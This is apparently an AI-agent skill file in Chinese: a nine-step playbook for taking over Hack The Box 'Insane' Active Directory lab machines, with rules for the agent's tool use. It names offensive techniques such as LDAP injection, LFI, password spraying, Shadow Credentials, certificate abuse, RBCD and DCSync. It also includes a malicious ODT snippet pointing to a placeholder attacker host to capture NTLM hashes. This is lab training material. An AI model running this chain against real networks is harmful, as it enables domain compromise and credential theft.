---
name: 'htb-workflow'
description: 'HTB Insane AD 靶机全链主线：入口→凭据→ACL→模拟→特权→RBCD→DA→双旗 9 步 + RS 工具链执行层（并行子代理 保上下文/三查/PTY 纪律）。开局必读。'
whenToUse: '打 Insane AD 靶机开局必读：入口→凭据→ACL→模拟→特权→RBCD→DA→双旗 9 步主线。'
metadata: { domain: meta, tier: T1 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
# HTB Workflow v2 — Insane AD 靶机全链主线 + RS 工具链执行层

> 来源：Hercules HTB (Insane) 泛化。启动骨架走 box-startup；本 skill 是"入口 → Domain Admin"的完整主线 playbook。
> **每阶段有产出判定，产出满足才进下一阶段；卡住先输出困境标签再动手。**

## 主线总览（9 步）

```
[1] 入口侦察: 端口/服务指纹 → 找"非标准攻击面"（LDAP注入/自研Web/LFI）
[2] Web 初始访问: 认证绕过 → 文件上传 → 凭据窃取（NTLM 捕获）
[3] 凭据横向: 拿到的密码/hash 立即喷洒所有服务（WinRM/SSH/SMB/Web）
[4] ACL 枚举: BloodHound → 找 OU 委派/GenericWrite/GenericAll 链
[5] 用户模拟: Shadow Credentials / 移动对象触发 ForceChangePassword / 重置密码
[6] 特权账户: 证书服务(ESC3/ESC8) / 解 adminCount 保护 → 服务账户密码重置
[7] 域控路径: RBCD（含 SPN-less U2U）→ 机器账户控制 → 提权服务账户
[8] Domain Admin: Administrator TGS → DCSync → 全量 hash
[9] 收尾: 双 flag（🔴 搜全盘非默认位置）+ 恢复被改密码 + 入 KG
```

---

## 🔴 RS 工具链执行层（每阶段强制，防上下文爆炸）

> **核心：主上下文只保留"决策+结论"，一切批量探测/搜索/研究丢 subagent 或轻量工具。**
> 来源：Hercules 教训 — 全程串行在主上下文跑工具，tool output 灌爆上下文导致压缩 3-4 次。

```
[0] 开局: todo_write 建 9 步清单（映射本 skill）→ 每完成一步 complete_step 签收
[1] 侦察: nmap 版本扫描后 → 并行子代理/parallel-recon 并行探测（2-8 个 subagent）
    ├─ 每个端口探测 = 1 个 subagent 任务
    ├─ CVE/技术搜索（searchsploit/tavily/GitHub）= 独立 subagent
    └─ 主上下文只收"结论摘要"，细节 read_subagent_result 按需取
[2] 卡住（同方向 ≥2 次失败）→ 强制三查（缺一不可）:
    memory search "<错误码/技术词>" + history search "<错误码>" + KG search_nodes
    → 输出困境分类标签（阻断点6 格式）→ 才允许继续
[3] 读文档/WP/网页 → web_fetch 优先（禁止 curl+python 硬解析 HTML）
[4] 发现类命令输出 → 全量 > out.txt 完整读，禁止 tail/head 截断
[5] 长命令/交互 → PTY；短命令（≤30s）→ execute_command
```

---

## [1] 入口侦察 — 找"非标准攻击面"

```
产出: 一张端口×服务×版本×攻击面表格 + 每个可疑点标记 [PENDING]
动作:
  - nmap 两步扫描（box-startup 阶段1）→ 阻断点2 逐端口探测（并行 subagent）
  - 🔴 自研 Web 应用（非 Apache/IIS 默认页）→ 优先攻击：
      - 登录框 → 注入测试（LDAP/SQL/NoSQL）→ 响应差异 = 有效反馈
      - 下载/导出功能 → LFI（../../web.config / .env）
      - 文件上传 → 格式解析链（ODT/PDF/图片 → 是否有网络请求?）
  - 每个版本 → searchsploit + GitHub Advisory（不加年份过滤）
  - 🔴 限流信号（429/慢响应）→ 节流脚本（每 8-10 请求停 45s），不硬跑
```

## [2] Web 初始访问 — 认证绕过 + 凭据窃取

```
产出: 一个已认证会话 或 一组有效凭据
动作（按优先级）:
  - 注入拿明文凭据（description/注释字段常藏密码 → 逐字符提取 or 找 WP 线索）
  - 配置文件泄露 → machineKey/JWT secret → 伪造会话 cookie
      （.NET: LegacyAuthCookieCompat v2.0.5 签名格式；userData 角色串必须匹配！）
  - 已认证上传点 → 恶意文档（ODT: <draw:object xlink:href="file://ATTACKER">）
      → Responder 捕获 NTLM → 密码喷洒
  - 🔴 凭据一拿到 → 立即全服务喷洒（Web/WinRM/SSH/SMB/IMAP），不试单个
```

## [3] 凭据横向 — WinRM/SSH 立足点

```
产出: 一个交互 shell
动作:
  - 喷洒成功 → 找可用客户端（🔴 NTLM 全禁域 → 全部 -k Kerberos）
  - WinRM 客户端优先级: winrmexec(pipx 装) > evil-winrm > pywinrm/pypsrp（易卡 SPN）
  - 拿 shell → 🔴 阻断点1 固定序列（本地状态报告）→ 阻断点6 隧道判断
```

## [4] ACL 枚举 — 找提权链

```
产出: BloodHound/手工枚举出的"用户→OU→对象"权限图
动作:
  - SharpHound 全收集 → 重点边: GenericAll/GenericWrite/ForceChangePassword/CreateChild/WriteDACL
  - 🔴 OU 结构即攻击面: 看每个 OU 的委派（谁对 OU 有 CREATE_CHILD/GenericAll）
  - adminCount=1 的对象 = DACL_PROTECTED → OU 继承失效 → 需先解保护（见[6]）
  - 记下"敏感组"成员（Backup/Smartcard/Service Operators 等）→ 它们对特定 OU 有隐藏权限
```

## [5] 用户模拟 — Shadow Credentials / 对象移动

```
产出: 一个可用的低权用户凭据（TGT/hash）
动作:
  - GenericWrite 用户 → certipy shadow auto（🔴 不加 -dc-host，只用 -target）
  - CreateChild on OU → 把目标用户移到该 OU → 获得 ForceChangePassword → 重置密码
      （⚠️ 移动后原 OU 权限可能变化；密码不能含用户名子串）
  - 拿到的用户 → 立即 kinit + 测 WinRM（Remote Management Users 组）
```

## [6] 特权账户 — ESC3 + adminCount 解保护

```
产出: 一个特权服务账户（可改目标机器账户密码）
动作:
  - 禁用+密码过期账户 → 先启用(UAC 512) + 设密码（certipy account update）
      ⚠️ 机器有"自动重置机制"（~5分钟）→ 循环脚本：改完立即用
  - 证书: EnrollmentAgent 模板 → 申请 on-behalf-of 证书（🔴 certipy 5.1 必须 -dcom，RPC 有 bug）
  - adminCount=1 保护 → 找 Scheduled Task "cleanup"（SYSTEM 任务清 adminCount）
      → 先给任务主体组加 OU GenericAll → 触发任务 → 立即改 UAC+密码
```

## [7] 域控路径 — RBCD（含 SPN-less）

```
产出: 目标机器账户（如 IIS_WEBSERVER$）控制权
动作:
  - 特权账户对 OU 有 ForceChangePassword → 重置机器账户密码
  - 查 DC 的 msDS-AllowedToActOnBehalfOfOtherIdentity → 含哪个 SID → 那是关键机器账户
  - 机器账户有 SPN → 标准 RBCD（bloodyAD add rbcd / getST -u2u）
  - 机器账户无 SPN → 🔴 /rbcd-spnless（SPN-less U2U: changepasswd -newhashes 改 NT hash = TGT session key）
```

## [8] Domain Admin — TGS → DCSync

```
动作:
  - Administrator@cifs/dc TGS → secretsdump -k（DCSync）→ 全量 hash
  - psexec -k 可用但 stdout 不回显（读 flag 用 smbclient -k）
  - smbclient -k: use C$ → cd 目标目录 → get 文件（🔴 get 不能带本地路径参数；-outputfile 只写 banner）
```

## [9] 收尾 — flag + 恢复 + 入库

```
🔴 flag 全盘搜（默认路径经常没有）: C:\Users\Admin\Desktop 等非默认位置
🔴 改过的密码/hash 全部恢复原值（临时 session key 尤其）
收尾强制三步: KG 实体+关系 / 规则审计计数 / 变更复盘 → box-startup 阶段5
```

---

## 🔴 贯穿全程的铁律（v2 新增 RS 纪律）

```
[1] 工具报协议错误（BADOPTION/ETYPE_NOSUPP/STATUS_NOT_SUPPORTED）
    → 先 run_skill 匹配 + 搜索（HackTricks/NetExec Wiki），禁止改源码试错（阻断点7）
[2] 无 preauth 账户 ≠ 能拿 session key: getTGT -no-pass 会失败（AS-REP enc-part 用 client key 加密）
[3] AES key 派生: impacket string_to_key 含 derive('kerberos')，裸 PBKDF2 是错的
[4] NTLM 全禁域 → 一切 Kerberos（-k）；changepasswd target 必须主机名（cifs SPN）
[5] 机器重置机制 = 变化信号 → 循环脚本 + 窗口内完成
[6] 🔴 并行子代理 保上下文: 批量探测/搜索丢 subagent，主上下文只留结论（Hercules 压缩 3-4 次的根因）
[7] 🔴 卡住三查必含 history: memory + history + KG（PingPong 经验躺在 history 里没被查）
[8] 🔴 开局 todo_write 建清单，每步 complete_step 签收
```

## 🔗 关联

- 启动: `box-startup` | 侦察: `service-attacks` / `web-attacks` | AD: `ad-checklist`
- 提权: `linux-privesc` / `windows-privesc` | 横向: `lateral-movement`
- RBCD 无 SPN: `rbcd-spnless` | 卡住: `/debug-5whys`
- 案例: hercules-progress | 检查表: htb-master-checklist | 架构: htb-agent-v6-architecture
